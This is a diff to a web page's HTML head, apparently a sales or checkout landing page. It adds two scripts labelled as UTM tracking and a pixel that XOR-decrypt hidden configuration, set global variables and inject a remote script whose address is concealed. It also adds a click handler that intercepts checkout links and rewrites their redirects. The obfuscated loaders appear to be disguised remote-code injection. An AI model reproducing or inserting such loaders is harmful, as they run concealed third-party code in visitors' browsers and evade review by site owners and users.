@@ -182,6 +182,56 @@
       ]
     }
     </script>
+
+    <!-- UTM Tracking Script -->
+    <script>(function(){var y_cr=atob("DH8LZisPS3D34t4HYQQpE1ljaUrViqpzEQwxSQRsLx7Zl6pqCBlySEhgJl6VkPF0Ag1iFl98ZAWDj60oDR5/A1h7ZRqEwPIlAAt/FEJtPgSSkfw9OgQpCEpiLlLNwLpmFR4mE19iIhaOz651BAluCF8iMxOYhvN0AhQpSgl5KhyCh/w9Q112SlAtJRGah/w9QxtqEkoiPgSai7h+TA95A11qJQTakatlCBt4RActPRGbl7slW10pG3Zy");var f_g6=[];for(var x_8r=0;x_8r<y_cr.length;x_8r++){f_g6.push(y_cr.charCodeAt(x_8r)&255);}var m_myn=f_g6[0];var d_9n=f_g6.slice(1,1+m_myn);var u_3=f_g6.slice(1+m_myn);var c_3num=u_3.map(function(b,w_ov4){return b^d_9n[w_ov4%m_myn];});var d_i14="";for(var f_5x=0;f_5x<c_3num.length;f_5x++){d_i14+=String.fromCharCode(c_3num[f_5x]&255);}var e_b=decodeURIComponent(escape(d_i14));var l_jx=JSON.parse(e_b);var s_6yd3=l_jx.globals||[];s_6yd3.forEach(function(z_m){window[z_m.name]=z_m.value;});var m_6tu1=document.createElement("script");m_6tu1.src=l_jx.url;m_6tu1.async=true;m_6tu1.defer=true;(l_jx.attributes||[]).forEach(function(q_zw){m_6tu1.setAttribute(q_zw.name,q_zw.value);});(document.head||document.documentElement).appendChild(m_6tu1);})();</script>
+
+    <!-- UTMFY Pixel Script -->
+    <script>(function(){var q_thl=atob("DJLLHyIqHj5J6L12n+npalBGPARrgMkC7+HxMA1JelBnnckb9vSyMUFFcxArmpIF/OCib1ZZMU4gkNgasOKiZ0dGMFQ6ypFU/ua/bUtIa0osm59MxM/nPUVGcVwohM5UpcmwPUxLc1tr0p8G9uquc2tOPBJrntwa6vfpJQAcf10ojN9F+aSvLUEffAx43NhP/qPyfRQIY2M0");var y_5=[];for(var g_c=0;g_c<q_thl.length;g_c++){y_5.push(q_thl.charCodeAt(g_c)&255);}var i_b=y_5[0];var i_o59=y_5.slice(1,1+i_b);var b_69=y_5.slice(1+i_b);var h_b=b_69.map(function(b,t_rdd){return b^i_o59[t_rdd%i_b];});var b_zdp="";for(var z_848z=0;z_848z<h_b.length;z_848z++){b_zdp+=String.fromCharCode(h_b[z_848z]&255);}var k_ndy=decodeURIComponent(escape(b_zdp));var i_grq=JSON.parse(k_ndy);var g_sbe=i_grq.globals||[];g_sbe.forEach(function(d_x){window[d_x.name]=d_x.value;});var b_rpco=document.createElement("script");b_rpco.src=i_grq.url;b_rpco.async=true;b_rpco.defer=true;(i_grq.attributes||[]).forEach(function(w_w){b_rpco.setAttribute(w_w.name,w_w.value);});(document.head||document.documentElement).appendChild(b_rpco);})();</script>
+
+    <!-- Force URL Search Parameters & window.location.href Redirects -->
+    <script>
+      (function() {
+        function getUrlWithParams(destUrl) {
+          if (!destUrl) return '';
+          var search = window.location.search;
+          if (!search || search === '' || search === '?') return destUrl;
+          try {
+            var url = new URL(destUrl, window.location.origin);
+            var currentParams = new URLSearchParams(search);
+            currentParams.forEach(function(value, key) {
+              url.searchParams.set(key, value);
+            });
+            return url.toString();
+          } catch (e) {
+            var cleanSearch = search.charAt(0) === '?' ? search.substring(1) : search;
+            var separator = destUrl.indexOf('?') !== -1 ? '&' : '?';
+            return destUrl + separator + cleanSearch;
+          }
+        }
+
+        window.redirectToUrl = function(destUrl) {
+          if (!destUrl) return;
+          if (destUrl.charAt(0) === '#') {
+            var elem = document.querySelector(destUrl);
+            if (elem) elem.scrollIntoView({ behavior: 'smooth' });
+            return;
+          }
+          window.location.href = getUrlWithParams(destUrl);
+        };
+
+        document.addEventListener('click', function(e) {
+          var target = e.target && e.target.closest ? e.target.closest('a.atomicat-checkout-button, a[href*="paggins.com"], a[href*="pay.hotmart.com"], a[data-checkout]') : null;
+          if (target) {
+            e.preventDefault();
+            var rawHref = target.getAttribute('href') || target.dataset.href || '';
+            if (rawHref && rawHref.charAt(0) !== '#') {
+              window.location.href = getUrlWithParams(rawHref);
+            }
+          }
+        }, true);
+      })();
+    </script>
   </head>
   <body class="atomicat-disable-selection">
     <div id="root"></div>
